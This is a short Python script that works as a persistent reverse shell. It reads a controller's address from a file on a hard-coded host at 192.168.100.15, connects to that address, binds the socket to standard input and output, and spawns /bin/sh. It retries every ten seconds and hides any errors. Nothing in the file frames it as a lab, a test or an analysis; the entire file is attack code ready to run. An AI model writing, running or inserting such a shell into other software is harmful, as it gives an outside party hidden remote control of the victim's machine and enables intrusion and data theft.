import socket
import os
import pty
import urllib.request
import time

def attempt_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    url = "http://192.168.100.15:8000/raw.txt"
    try:
        response = urllib.request.urlopen(url).read().decode().strip()
        ip, port = response.split(":")
        s.connect((ip, int(port)))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception:
        pass
    finally:
        s.close()

while True:
    attempt_connection()
    time.sleep(10)
